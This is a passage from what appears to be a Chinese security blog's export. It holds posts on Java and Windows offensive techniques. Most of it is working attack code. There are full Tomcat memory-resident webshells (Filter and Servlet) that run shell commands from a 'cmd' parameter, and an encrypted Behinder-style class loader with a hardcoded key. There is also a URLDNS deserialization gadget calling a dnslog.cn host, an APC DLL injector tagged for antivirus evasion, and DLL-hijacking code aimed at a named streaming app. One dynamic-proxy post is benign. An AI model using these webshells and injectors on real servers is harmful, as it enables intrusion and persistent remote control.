                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }
            filterChain.doFilter(servletRequest,servletResponse);
        }

        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request, Map<String, Object> pageContext){
            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            try {

                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try {
                    uclass = cl.loadClass("U");
                } catch (ClassNotFoundException e) {
                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
                }
                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g", byte[].class);
                Um.setAccessible(true);
                String k = passwd;
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class eclass = (Class) Um.invoke(u, eClassBytes);
                Object a = eclass.newInstance();
                Method b = eclass.getDeclaredMethod("equals", Object.class);
                b.setAccessible(true);
                b.invoke(a, pageContext);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public void destroy() {
        }
    }

    LanMyFilter lanMyFilter = new LanMyFilter();
    String filterName = "lan";
%>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%
    FilterDef filterDef = new FilterDef();
    filterDef.setFilterName(filterName);
    filterDef.setFilterClass(lanMyFilter.getClass().getName());
    filterDef.setFilter(lanMyFilter);
    filterDef.setAsyncSupported("true");
    standardContext.addFilterDef(filterDef);
%>

<%
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(filterName);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMap(filterMap);
%>

<%
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
%>

<%
    Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigsField.setAccessible(true);
    HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
    filterConfigs.put(filterName,filterConfig);
%>

```
### 3.2.3、Servlet
```
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.util.logging.Filter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%--
/**
 * 不用改了
 * 标准的cmd内存马&冰蝎马
 * 用法:
 *  1、执行命令：http://xxx.xxx.xxx.x/?cmd=whoami
 *  2、冰蝎连接：http://xxx.xxx.xxx.x/ 密码：lan
 *
 * 2023/08/03
 */
--%>
<%!
    public class LanServlet implements Servlet {

        String passwd = "73f50c9f17291ce9";

        @Override
        public void init(ServletConfig config) throws ServletException {
        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String command = servletRequest.getParameter("cmd");
            if (command != null){
                String system = System.getProperty("os.name");
                if (system.toLowerCase().contains("win")) {
                    Process process = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                } else {
                    Process process = Runtime.getRuntime().exec(new String[]{"bash","-c",command});
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        stringBuilder.append(line + '\n');
                    }

                    servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
                    servletResponse.getOutputStream().flush();
                    servletResponse.getOutputStream().close();
                }
            }

            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse) servletResponse;
            HttpSession session = request.getSession();

            Map<String, Object> pageContext = new HashMap<String, Object>();
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);

            ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

            if (request.getMethod().equals("POST")) {
                if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    //从java.lang.ClassLoader中获取到Class对象
                    Class Lclass = cl.getClass().getSuperclass();
                    //调用RushThere()方法，注入内存马
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                } else {
                    Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                    RushThere(Lclass, cl, session, request, pageContext);
                }
            }
        }

        public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
            byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
            try {

                Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try {
                    uclass = cl.loadClass("U");
                } catch (ClassNotFoundException e) {
                    uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
                }
                Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g", byte[].class);
                Um.setAccessible(true);
                String k = passwd;
                session.setAttribute("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class eclass = (Class) Um.invoke(u, eClassBytes);
                Object a = eclass.newInstance();
                Method b = eclass.getDeclaredMethod("equals", Object.class);
                b.setAccessible(true);
                b.invoke(a, pageContext);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {
        }
    }

    LanServlet lanServlet = new LanServlet();
%>

<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%
    String name = "lanServlet";

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName(name);
    wrapper.setServlet(lanServlet);
%>

<%
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/lan",name);
%>

```
# 学习
https://xz.aliyun.com/t/10696#toc-4

https://github.com/ce-automne/TomcatMemShell/blob/main/DeSerialize/filter/tomcat89/IFRain.java




























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>动态代理</title>
    <url>/2023/08/22/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[# 动态代理
通过java.lang.reflect.Proxy和java.lang.reflect.InvocationHandler即可实现

被代理的那个类必须要先实现java.lang.reflect.InvocationHandler类才行

```
//被代理的类

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class UserInformaiton implements InvocationHandler {

    protected Map map;

    public UserInformaiton(Map map) {
        this.map = map;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        System.out.println("不管你执行代理类的哪个方法，都会调用被代理类的invoke()方法");
        return null;
    }
}


```

```
//代理类

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class ProxyTest {
    public static void main(String[] args) {
        Map map = new HashMap();
        InvocationHandler handler = new UserInformaiton(map);
        Map proxyString = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler);

        proxyString.put("name","maniubi");
    }
}


```
效果
![](https://s3.hedgedoc.org/demo/uploads/233bd94d-9b44-4839-9122-e7fcc3d4af7d.png)
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>零碎知识</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS</title>
    <url>/2023/08/22/URLDNS/</url>
    <content><![CDATA[# URLDNS
## 简述
URLDNS的作用只有一个，判断目标系统上否存在 Java 反序列化漏洞，而且不限制jdk版本
## 原理
java.util.HashMap实现了Serializeble接口且重写了readObject()方法；在反序列化的时候回调用了putVal()方法，就会触发dns请求
## 分析
首先查看HashMap类，实现了Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/fa4719a2-3e6a-4522-a189-ff2811b3aaf0.png)

然后搜索readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/74d92c61-f535-43f1-bf31-b319395bef84.png)

可以看到，这里的readObject()方法已经被重写了，而方法的最后，调用了putVal()方法，而putVal()方法又调用来了hash()方法，并传入了一个key，我们跟进hash()方法

![](https://s3.hedgedoc.org/demo/uploads/7db43df5-3b3e-4c5c-b3ed-5f25985e81a9.png)


hash()方法传入了一个key对象，最后又调用了key.hashCode()方法

而我们这个key对象，是一个URL对象，我们跟进URL.hashCode()方法

![](https://s3.hedgedoc.org/demo/uploads/85a50495-8dcb-4c1d-93de-f7f1cb187586.png)

可以看到，首先判断hashCode是否为-1，如果不是，就直接返回hashCode；如果是，就将URL对象传入handler.hashCode()方法并调用得到hashCode

![](https://s3.hedgedoc.org/demo/uploads/ef3ee57b-a18b-4984-8808-e30a9c185646.png)

而hashCode的值默认为-1，我们跟进handler.hashCode()方法

![](https://s3.hedgedoc.org/demo/uploads/c3d4e73e-f07a-4d03-a0a4-f4ee714776db.png)

这里最终传入URL对象u，并调用了getHostAddress()方法，我们跟进getHostAddress()方法

![](https://s3.hedgedoc.org/demo/uploads/8c024d04-e39e-48f0-ad88-27e13c544fdf.png)

最终，URL对象传入getHostAddress()方法，并在436行调用getByName()方法，触发了dns请求

调用链如下：
1. HashMap.readObject()
2. HashMap.putVal()
3. HashMap.hash()
4. URL.hashCode()
5. URLStreamHandler.hashCode()
6. URLStreamHandler.getHostAddress()

## payload编写逻辑
根据上面的分析，写一个简单的demo

```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws MalformedURLException {
        URL url = new URL("http://d6tzs5.dnslog.cn");
        HashMap hashMap = new HashMap();
        hashMap.put(url,"lantest");

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
            xlh.writeObject(hashMap);
            xlh.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
            fxlh.readObject();
            fxlh.close();
            fileInputStream.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
效果：

![](https://s3.hedgedoc.org/demo/uploads/76ec1eec-651f-46c6-9f13-4ccd84a855e3.png)

但是这里有两个dns请求，我们要的效果是在反序列化的时候触发dns请求，所以说只能有一个dns请求，不过我们在将URL对象存入HashMap对象的时候（HashMap.put()方法），也会调用HashMap.putVal()方法，而调用链的最后，也会触发dns请求，这个得规避一下

![](https://s3.hedgedoc.org/demo/uploads/58f44f15-5cf1-4148-bf64-2b19c1c3db4e.png)

根据上面的调用链分析，当进入到URL.hashCode()方法的时候，会判断URL.hashCode这个成员变量的值是否为-1，如果不等于-1，那就直接返回hashCode的值（-1），就不会进行接下来的dns请求

![](https://s3.hedgedoc.org/demo/uploads/6856989b-d8d0-43b2-9c20-63ed354ed144.png)

不过我们查看URL.hashCode这个成员变量，是用private修饰，无法直接改，只能用反射修改

```
try {
    Class uClass = Class.forName("java.net.URL");
    Field field = uClass.getDeclaredField("hashCode");
    field.setAccessible(true);
    //设置URL.hashCode的值为666，这样就不会进入请求dns的调用链
    field.set(url,666);
}catch (Exception e) {
    e.printStackTrace();
}

```

还有个问题，将URL对象添加到HashMap对象后，需要正常的进入后面的dns请求的调用链，所以我们还要将URL.hashCode的值改回来

```
field.set(field,-1);
```
## 完整代码
```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws MalformedURLException {
        URL url = new URL("http://ed1se9.dnslog.cn");
        HashMap hashMap = new HashMap();

        try {
            Class uClass = Class.forName("java.net.URL");
            Field field = uClass.getDeclaredField("hashCode");
            field.setAccessible(true);
            //设置URL.hashCode的值为666，这样就不会进入请求dns的调用链
            field.set(url,666);
            hashMap.put(url, "lantest");
            field.set(url,-1);

            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
            xlh.writeObject(hashMap);
            xlh.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
            fxlh.readObject();
            fxlh.close();
            fileInputStream.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>APC注入</title>
    <url>/2024/03/26/APC%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[# 简介
1. 即“异步调用过程”，在windows中APC是一种并发机制（异步调用过程解释）
2. 当处于用户模式的APC压入线程APC队列后，该线程并不直接调用APC函数，除非该线程处于可通知状态
3. 调用的APC顺序为先入先出。
4. 每一个线程都有自己的APC队列，可以使用API将一个APC插入到线程的APC队列中
5. APC有两种形式，由内核产生的APC称为内核态（kernel-mode）APC，而由用户应用调用的APC称为用户态（user-mode）APC
6. APC其实是通过向线程中插入回调函数来实现的，但是调用这个回调函数是有条件的
  a. 当用户模式 APC 排队时，它排队的线程不会被定向到调用 APC 函数，除非它处于可警告状态。线程在调用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、WaitForMultipleObjectsEx、WaitForSingleObjectEx函数时进入可警告状态
  b. 如果在 APC 排队之前等待满足，则线程不再处于可警告等待状态，因此不会执行 APC 函数
  c. 但是，APC 仍在排队，因此当线程调用另一个可警告的等待函数时，APC 函数将被执行。
  
# 实现原理
往线程APC队列中添加APC，系统就会产生一个“软中断”，而在线程下一次被调用的时候，就会执行APC函数

# 实现条件
1. 必须是多线程的情况下
2. 必须要调用设定的回调函数

# 代码实现
```C++
#include <cstdio>
#include <cstring>
#include <Windows.h>
#include <tlhelp32.h>

//提权
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    BOOL fOk = FALSE;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        fOk = (GetLastError() == ERROR_SUCCESS);
        CloseHandle(hToken);
    }
    return fOk;
}

//获取进程的PID
DWORD GetProcessPID(LPCWSTR processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-]创建进程快照失败\n");
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, processName) != 0) {
            if (!Process32Next(hSnapshot, &processEntry)) {
                printf("[-]未发现%ls进程\n", processName);
                CloseHandle(hSnapshot);
                return 0;
            }
        }

        printf("%ls进程的PID为：%lu\n", processName, processEntry.th32ProcessID);
        CloseHandle(hSnapshot);
        return processEntry.th32ProcessID;
    }

    printf("[-]没有返回进程信息\n");
    CloseHandle(hSnapshot);
    return 0;
}

void APCInjectDll(DWORD pid, LPCSTR dllPath) {
    EnableDebugPrivilege();
    // 1. 打开进程，获取句柄
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess != NULL) {
        DWORD sizeDllPath = strlen(dllPath);
        LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeDllPath, MEM_COMMIT, PAGE_READWRITE);
        if (mem != NULL) {
            BOOL writeMem = WriteProcessMemory(hProcess, mem, dllPath, sizeDllPath, NULL);
            if (writeMem) {
                FARPROC loadLibraryAddr = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
                if (loadLibraryAddr != NULL) {
                    THREADENTRY32 te;
                    te.dwSize = sizeof(te);
                    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
                    DWORD dwRet = 0;
                    HANDLE hThread = NULL;
                    if (Thread32First(hSnap, &te)) {
                        do {
                            if (te.th32OwnerProcessID == pid) {
                                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                                if (hThread) {
                                    dwRet = QueueUserAPC((PAPCFUNC)loadLibraryAddr, hThread,(ULONG_PTR)mem);
                                    hThread = NULL;
                                }
                            }
                        } while (Thread32Next(hSnap, &te));
                    }
                    CloseHandle(hThread);
                    CloseHandle(hProcess);
                    CloseHandle(hSnap);
                }
            }
        }
    }
}



int main() {
    DWORD pid = GetProcessPID(L"notepad.exe");
    APCInjectDll(pid, "D:\\study\\C++\\dll\\Dll5\\x64\\Debug\\Dll5.dll");
}
```
# 学习
https://www.cnblogs.com/nice0e3/p/15318330.html]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>Dll劫持</title>
    <url>/2024/03/26/Dll%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[
# 简述
其实就是常说的白加黑

# 优点
1. 挖掘成本低
2. 免杀成本低
3. 存活更长久

# 类别
这里分为两类
1. 加载找不到的dll
2. 加载已存在的dll

## 加载找不到的dll

这里拿bilibili的直播姬做例子
首先拿ProcessMonitor监听livehime.exe，filter如下

![](https://s3.hedgedoc.org/demo/uploads/8f479052-5ed8-43ec-9470-2d2a9ea078ea.png)

然后运行livehime.exe
可以看到，这里有三个dll没有找到，我们选第一个WINMM.dll测试

### WINMM.dll

![](https://s3.hedgedoc.org/demo/uploads/644c83e4-bbe5-4c4c-82d1-fb149fb74fde.png)

这里我们自己写一个WINMM.dll，代码入下：

```C++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "Windows.h"
#include "framework.h"
#include <cstdlib>


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```

将生成的dll放入D:\livehime，最后运行

![](https://s3.hedgedoc.org/demo/uploads/f0527fa8-8bbf-46a1-aff7-68c9190ff06c.png)

是缺了哪些函数，用dumpbin.exe查看WINMM.dll需要哪些函数

![](https://s3.hedgedoc.org/demo/uploads/cf602597-aca3-4f9f-9625-37b934ba9c4c.png)

然后代码中加上即可

![](https://s3.hedgedoc.org/demo/uploads/600f0194-e635-4dab-9918-032a98a9a6be.png)

最终效果：

![](https://s3.hedgedoc.org/demo/uploads/d0ebff08-a918-47e4-8181-f9005d5a07a6.png)

成功弹出计算器

### profapi.dll

![](https://s3.hedgedoc.org/demo/uploads/8cba5605-5f7f-4101-89a2-a948a5c432ec.png)

代码如下：

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "Windows.h"
#include "framework.h"
#include <cstdlib>


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



```

![](https://s3.hedgedoc.org/demo/uploads/47ae05e1-4f2c-48d8-9881-6d5f0a2a0c23.png)

![](https://s3.hedgedoc.org/demo/uploads/f20c1159-c2f4-4ff6-b403-f61206eb790d.png)

当然，其他的dll也可以这样尝试

## 加载已存在的dll

已经存在的dll，exe程序肯定是需要dll里面的某些个函数才能正常运行啦

如果直接按照上面的方法来替换已经存在的dll的话，那么肯定exe程序运行要出问题

那么就可以写一个代码，先执行我们的代码，再跳转到正常的dll中正常执行

这里需要用到工具“AheadLib”来实现

### streaming-processor.dll
首先拿ProcessMonitor监听livehime.exe，filter如下

![](https://s3.hedgedoc.org/demo/uploads/fd7d5710-ed4e-478e-945e-475bf9fee838.png)

可以看到，streaming-processor.dll是在D:\livehime\4.60.1.6325中并加载成功了的

![](https://s3.hedgedoc.org/demo/uploads/23fc6524-3d0b-44e9-8117-da5c25c02094.png)

用 AheadLib 搞一个dll代码

```C++

//
// created by AheadLibEx
// Author:i1tao
// Blog:https://www.cnblogs.com/0xc5
// Github:https://github.com/i1tao/AheadLibEx
// 

#include <windows.h>
#include <Shlwapi.h>

#pragma comment( lib, "Shlwapi.lib")

#pragma comment(linker, "/EXPORT:CreateStreamingProcessor=AheadLibEx_CreateStreamingProcessor,@1")


extern "C" 
{
PVOID pfnAheadLibEx_CreateStreamingProcessor;
}


static HMODULE g_OldModule = NULL;

VOID WINAPI Free()
{
	if (g_OldModule)
	{
		FreeLibrary(g_OldModule);
	}
}


BOOL WINAPI Load()
{
	LPCSTR tzPath = "D:\\livehime\\4.60.1.6325\\streaming-processor1.dll";
	TCHAR tzTemp[MAX_PATH * 2];

	//
	// 这里是否从系统目录或当前目录加载原始DLL
	//
	//GetModuleFileName(NULL,tzPath,MAX_PATH); //获取本目录下的
	//PathRemoveFileSpec(tzPath);

	//GetSystemDirectory(tzPath, MAX_PATH); //默认获取系统目录的

	//lstrcat(tzPath, TEXT("\\streaming-processor.dll"));

	g_OldModule = LoadLibraryA(tzPath);
	if (g_OldModule == NULL)
	{
		wsprintf(tzTemp, TEXT("无法找到模块 %s,程序无法正常运行"), tzPath);
		MessageBox(NULL, tzTemp, TEXT("AheadLibEx"), MB_ICONSTOP);
	}

	return (g_OldModule != NULL);

}


FARPROC WINAPI GetAddress(PCSTR pszProcName)
{
	FARPROC fpAddress;
	CHAR szProcName[64];
	TCHAR tzTemp[MAX_PATH];

	fpAddress = GetProcAddress(g_OldModule, pszProcName);
	if (fpAddress == NULL)
	{
		if (HIWORD(pszProcName) == 0)
		{
			wsprintfA(szProcName, "#%d", pszProcName);
			pszProcName = szProcName;
		}

		wsprintf(tzTemp, TEXT("无法找到函数 %hs,程序无法正常运行"), pszProcName);
		MessageBox(NULL, tzTemp, TEXT("AheadLibEx"), MB_ICONSTOP);
		ExitProcess(-2);
	}
	return fpAddress;
}

BOOL WINAPI Init()
{
	pfnAheadLibEx_CreateStreamingProcessor = GetAddress("CreateStreamingProcessor");
	return TRUE;
}	

DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)
{
	HANDLE hProcess;

	PVOID addr1 = reinterpret_cast<PVOID>(0x00401000);
	BYTE data1[] = { 0x90, 0x90, 0x90, 0x90 };

